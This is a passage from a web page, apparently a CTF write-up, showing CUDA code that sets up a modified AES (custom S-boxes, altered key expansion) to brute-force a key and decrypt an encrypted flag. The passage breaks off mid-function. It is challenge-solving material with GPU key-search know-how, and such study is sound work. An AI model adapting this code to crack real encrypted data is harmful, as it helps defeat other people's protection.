class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cuda_runtime.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;device_launch_parameters.h&quot;</span></span></span><br><span class="line"><span class="comment">// 密文</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> EncFlag[<span class="number">48</span>];</span><br><span class="line"><span class="comment">// 逆sbox</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> inv_S[<span class="number">256</span>];</span><br><span class="line"><span class="comment">// sbox</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> S[<span class="number">256</span>];</span><br><span class="line"><span class="comment">// 轮常量</span></span><br><span class="line">__constant__ <span class="type">uint32_t</span> rcon[<span class="number">10</span>];</span><br><span class="line"><span class="comment">// hash明文模板</span></span><br><span class="line">__constant__ <span class="type">uint8_t</span> hash_plaintext_template[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> inv_S_user[<span class="number">256</span>] &#123; </span><br><span class="line"><span class="number">0xD1</span>, <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0xF9</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0xFF</span>, <span class="number">0xCD</span>, <span class="number">0x1F</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0xDC</span>, <span class="number">0xBB</span>,</span><br><span class="line"><span class="number">0x5B</span>, <span class="number">0xA9</span>, <span class="number">0xFA</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xE4</span>, <span class="number">0x4D</span>, <span class="number">0xDF</span>, <span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x01</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x4B</span>, <span class="number">0xC8</span>, <span class="number">0xD2</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x7B</span>, <span class="number">0xF8</span>, <span class="number">0x43</span>, <span class="number">0x37</span>,</span><br><span class="line"><span class="number">0x4F</span>, <span class="number">0x59</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xF0</span>, <span class="number">0xC3</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0x03</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0xAD</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x83</span>, <span class="number">0xEB</span>, <span class="number">0xBA</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>,</span><br><span class="line"><span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x0C</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x2C</span>, <span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x5D</span>,</span><br><span class="line"><span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x1D</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0xD0</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x7D</span>, <span class="number">0xE5</span>, <span class="number">0x9D</span>,</span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0x9B</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0xE0</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x24</span>, <span class="number">0xC9</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>,</span><br><span class="line"><span class="number">0xC5</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0xDE</span>, <span class="number">0x9F</span>, <span class="number">0x55</span>, <span class="number">0xF1</span>, <span class="number">0xA2</span>, <span class="number">0xFD</span>, <span class="number">0xCF</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xCA</span>, <span class="number">0x0A</span>, <span class="number">0xF6</span>, <span class="number">0xB8</span>,</span><br><span class="line"><span class="number">0x2D</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0xEE</span>, <span class="number">0x1C</span>, <span class="number">0x22</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>, <span class="number">0x0B</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x7E</span>,</span><br><span class="line"><span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x57</span>, <span class="number">0xB1</span>, <span class="number">0x8C</span>, <span class="number">0x9C</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0x3A</span>, <span class="number">0x97</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0xFC</span>,</span><br><span class="line"><span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xE3</span>, <span class="number">0x31</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x65</span>, <span class="number">0xA4</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x11</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x2E</span>,</span><br><span class="line"><span class="number">0x06</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0xED</span>, <span class="number">0x85</span>, <span class="number">0xF5</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0x46</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> S_user[<span class="number">256</span>]&#123; </span><br><span class="line"><span class="number">0x3f</span>, <span class="number">0x1e</span>, <span class="number">0xfc</span>, <span class="number">0x3d</span>, <span class="number">0x68</span>, <span class="number">0x51</span>, <span class="number">0xf0</span>, <span class="number">0x20</span>, <span class="number">0x92</span>, <span class="number">0x02</span>, <span class="number">0x9d</span>, <span class="number">0xac</span>, <span class="number">0x54</span>, <span class="number">0x6e</span>, <span class="number">0xfb</span>, <span class="number">0x42</span>,</span><br><span class="line"><span class="number">0x29</span>, <span class="number">0xe8</span>, <span class="number">0x23</span>, <span class="number">0x2a</span>, <span class="number">0xd5</span>, <span class="number">0xa2</span>, <span class="number">0x3a</span>, <span class="number">0xc0</span>, <span class="number">0xd4</span>, <span class="number">0xba</span>, <span class="number">0xb5</span>, <span class="number">0x84</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0x5c</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xf2</span>, <span class="number">0x22</span>, <span class="number">0xa7</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0xeb</span>, <span class="number">0x32</span>, <span class="number">0x0d</span>, <span class="number">0x8a</span>, <span class="number">0x89</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x5e</span>, <span class="number">0xa0</span>, <span class="number">0xef</span>, <span class="number">0x67</span>,</span><br><span class="line"><span class="number">0x49</span>, <span class="number">0xd3</span>, <span class="number">0x18</span>, <span class="number">0x76</span>, <span class="number">0xbd</span>, <span class="number">0xd0</span>, <span class="number">0x8d</span>, <span class="number">0x2f</span>, <span class="number">0xb4</span>, <span class="number">0x55</span>, <span class="number">0xc5</span>, <span class="number">0xc8</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x66</span>, <span class="number">0x04</span>,</span><br><span class="line"><span class="number">0xd8</span>, <span class="number">0x01</span>, <span class="number">0x5a</span>, <span class="number">0x2e</span>, <span class="number">0xed</span>, <span class="number">0x91</span>, <span class="number">0xff</span>, <span class="number">0x15</span>, <span class="number">0x6c</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x24</span>, <span class="number">0x72</span>, <span class="number">0x1a</span>, <span class="number">0x75</span>, <span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x56</span>, <span class="number">0xbf</span>, <span class="number">0xb1</span>, <span class="number">0x73</span>, <span class="number">0xc7</span>, <span class="number">0x95</span>, <span class="number">0x05</span>, <span class="number">0xb6</span>, <span class="number">0x52</span>, <span class="number">0x31</span>, <span class="number">0xb3</span>, <span class="number">0x10</span>, <span class="number">0x2b</span>, <span class="number">0x6f</span>, <span class="number">0x43</span>, <span class="number">0xbb</span>,</span><br><span class="line"><span class="number">0x62</span>, <span class="number">0x7c</span>, <span class="number">0x7b</span>, <span class="number">0xa3</span>, <span class="number">0xbe</span>, <span class="number">0xd9</span>, <span class="number">0xbc</span>, <span class="number">0xdc</span>, <span class="number">0xc9</span>, <span class="number">0x8f</span>, <span class="number">0xa4</span>, <span class="number">0xe3</span>, <span class="number">0xe7</span>, <span class="number">0x17</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>,</span><br><span class="line"><span class="number">0xca</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>, <span class="number">0xae</span>, <span class="number">0x83</span>, <span class="number">0x63</span>, <span class="number">0x82</span>, <span class="number">0x27</span>, <span class="number">0x4a</span>, <span class="number">0x21</span>, <span class="number">0x71</span>, <span class="number">0x2c</span>, <span class="number">0x57</span>, <span class="number">0x7d</span>, <span class="number">0xaf</span>, <span class="number">0x44</span>,</span><br><span class="line"><span class="number">0x85</span>, <span class="number">0xc1</span>, <span class="number">0x47</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>, <span class="number">0xf4</span>, <span class="number">0xfd</span>, <span class="number">0x3c</span>, <span class="number">0xf1</span>, <span class="number">0x45</span>, <span class="number">0x1f</span>, <span class="number">0x5b</span>, <span class="number">0xb8</span>, <span class="number">0xa1</span>, <span class="number">0xc4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0x09</span>, <span class="number">0xea</span>, <span class="number">0xee</span>, <span class="number">0x0c</span>, <span class="number">0xd6</span>, <span class="number">0x61</span>, <span class="number">0xc6</span>, <span class="number">0xaa</span>, <span class="number">0xb0</span>, <span class="number">0x69</span>, <span class="number">0x81</span>, <span class="number">0xb9</span>, <span class="number">0x7f</span>, <span class="number">0xec</span>, <span class="number">0x94</span>,</span><br><span class="line"><span class="number">0xce</span>, <span class="number">0xa9</span>, <span class="number">0x97</span>, <span class="number">0x3b</span>, <span class="number">0xda</span>, <span class="number">0x8e</span>, <span class="number">0xe5</span>, <span class="number">0x86</span>, <span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0xad</span>, <span class="number">0xd1</span>, <span class="number">0xd7</span>, <span class="number">0x40</span>, <span class="number">0xb2</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0xcb</span>, <span class="number">0xb7</span>, <span class="number">0x1c</span>, <span class="number">0x7a</span>, <span class="number">0xf6</span>, <span class="number">0x87</span>, <span class="number">0xcd</span>, <span class="number">0x4f</span>, <span class="number">0x9f</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x0f</span>, <span class="number">0x6a</span>, <span class="number">0xa8</span>, <span class="number">0xde</span>, <span class="number">0xc3</span>,</span><br><span class="line"><span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0xfa</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x90</span>, <span class="number">0xdf</span>, <span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xe0</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xe2</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x26</span>, <span class="number">0x6b</span>, <span class="number">0x0b</span>, <span class="number">0x3e</span>, <span class="number">0x1d</span>, <span class="number">0xe1</span>, <span class="number">0x58</span>, <span class="number">0x38</span>, <span class="number">0xc2</span>, <span class="number">0x78</span>, <span class="number">0x0e</span>, <span class="number">0x59</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>,</span><br><span class="line"><span class="number">0x88</span>, <span class="number">0xdd</span>, <span class="number">0x9b</span>, <span class="number">0xd2</span>, <span class="number">0x19</span>, <span class="number">0x7e</span>, <span class="number">0xf9</span>, <span class="number">0xdb</span>, <span class="number">0xfe</span>, <span class="number">0x60</span>, <span class="number">0x13</span>, <span class="number">0x4c</span>, <span class="number">0xcc</span>, <span class="number">0xf3</span>, <span class="number">0xa5</span>, <span class="number">0x14</span>,</span><br><span class="line"><span class="number">0x34</span>, <span class="number">0x96</span>, <span class="number">0x80</span>, <span class="number">0xe6</span>, <span class="number">0x9a</span>, <span class="number">0xf5</span>, <span class="number">0x9e</span>, <span class="number">0xe4</span>, <span class="number">0x2d</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x0a</span>, <span class="number">0xcf</span>, <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x06</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> rcon_user[<span class="number">10</span>]&#123;</span><br><span class="line"> <span class="number">0x01000000UL</span>, <span class="number">0x02000000UL</span>, <span class="number">0x04000000UL</span>, <span class="number">0x08000000UL</span>, <span class="number">0x10000000UL</span>,</span><br><span class="line"> <span class="number">0x20000000UL</span>, <span class="number">0x40000000UL</span>, <span class="number">0x80000000UL</span>, <span class="number">0x1B000000UL</span>, <span class="number">0x36000000UL</span> </span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD32H(x, y) do &#123; \</span></span><br><span class="line"><span class="meta">    uint32_t _temp = 0; \</span></span><br><span class="line"><span class="meta">    _temp  = ((uint32_t)((y)[0] &amp; 0xFF) &lt;&lt; 24); \</span></span><br><span class="line"><span class="meta">    _temp |= ((uint32_t)((y)[1] &amp; 0xFF) &lt;&lt; 16); \</span></span><br><span class="line"><span class="meta">    _temp |= ((uint32_t)((y)[2] &amp; 0xFF) &lt;&lt; 8); \</span></span><br><span class="line"><span class="meta">    _temp |= ((uint32_t)((y)[3] &amp; 0xFF)); \</span></span><br><span class="line"><span class="meta">    (x) = _temp; \</span></span><br><span class="line"><span class="meta">&#125; while(0) </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STORE32H(x, y) \</span></span><br><span class="line"><span class="meta">   (y)[0] = (uint8_t)(((x)&gt;&gt;24) &amp; 0xff); (y)[1] = (uint8_t)(((x)&gt;&gt;16) &amp; 0xff);   \</span></span><br><span class="line"><span class="meta">       (y)[2] = (uint8_t)(((x)&gt;&gt;8) &amp; 0xff); (y)[3] = (uint8_t)((x) &amp; 0xff);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \</span></span><br><span class="line"><span class="meta">                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROF32(x, n)  (((x) <span class="string">&lt;&lt; (n)) | ((x) &gt;</span>&gt; (32-(n))))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROR32(x, n)  (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32-(n))))</span></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">uint32_t</span> <span class="title">MixWord</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">const</span> <span class="type">uint8_t</span>* LocalS)</span> </span>&#123;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> word;</span><br><span class="line"><span class="type">uint8_t</span> bytes[<span class="number">4</span>];</span><br><span class="line">&#125; in, out;</span><br><span class="line"></span><br><span class="line">in.word = x;</span><br><span class="line"></span><br><span class="line">out.bytes[<span class="number">0</span>] = LocalS[in.bytes[<span class="number">1</span>]];  <span class="comment">// BYTE(x, 1)</span></span><br><span class="line">out.bytes[<span class="number">1</span>] = LocalS[in.bytes[<span class="number">0</span>]];  <span class="comment">// BYTE(x, 0)</span></span><br><span class="line">out.bytes[<span class="number">2</span>] = LocalS[in.bytes[<span class="number">3</span>]];  <span class="comment">// BYTE(x, 3)</span></span><br><span class="line">out.bytes[<span class="number">3</span>] = LocalS[in.bytes[<span class="number">2</span>]];  <span class="comment">// BYTE(x, 2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ((<span class="type">uint32_t</span>)out.bytes[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">((<span class="type">uint32_t</span>)out.bytes[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">((<span class="type">uint32_t</span>)out.bytes[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">((<span class="type">uint32_t</span>)out.bytes[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">keyExpansion</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> * key, <span class="type">uint32_t</span> keyLen, <span class="type">void</span> * aesKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="type">uint32_t</span> eK[<span class="number">44</span>], dK[<span class="number">44</span>];</span><br><span class="line"><span class="type">int</span> Nr;</span><br><span class="line">&#125;AesKey;</span><br><span class="line">AesKey* p_aesKey = (AesKey*)aesKey;</span><br><span class="line"><span class="type">uint32_t</span>* w = p_aesKey-&gt;eK;</span><br><span class="line"><span class="type">uint32_t</span>* v = p_aesKey-&gt;dK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">LOAD32H</span>(w[i], key + <span class="number">4</span> * i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">w[<span class="number">4</span>] = w[<span class="number">0</span>] ^ <span class="built_in">MIX</span>(w[<span class="number">3</span>]) ^ rcon[i];</span><br><span class="line">w[<span class="number">5</span>] = w[<span class="number">1</span>] ^ w[<span class="number">4</span>];</span><br><span class="line">w[<span class="number">6</span>] = w[<span class="number">2</span>] ^ w[<span class="number">5</span>];</span><br><span class="line">w[<span class="number">7</span>] = w[<span class="number">3</span>] ^ w[<span class="number">6</span>];</span><br><span class="line">w += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w = p_aesKey-&gt;eK + <span class="number">44</span> - <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">11</span>; ++j) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">v[i] = w[i];</span><br><span class="line">&#125;</span><br><span class="line">w -= <span class="number">4</span>;</span><br><span class="line">v += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">loadStateArray</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint8_t</span>* in)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">state[j][i] = *in++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">int</span> <span class="title">storeStateArray</span><span class="params">(<span class="type">uint8_t</span>(*state)[<span class="number">4</span>], <span class="type">uint8_t</span>* out)</span> 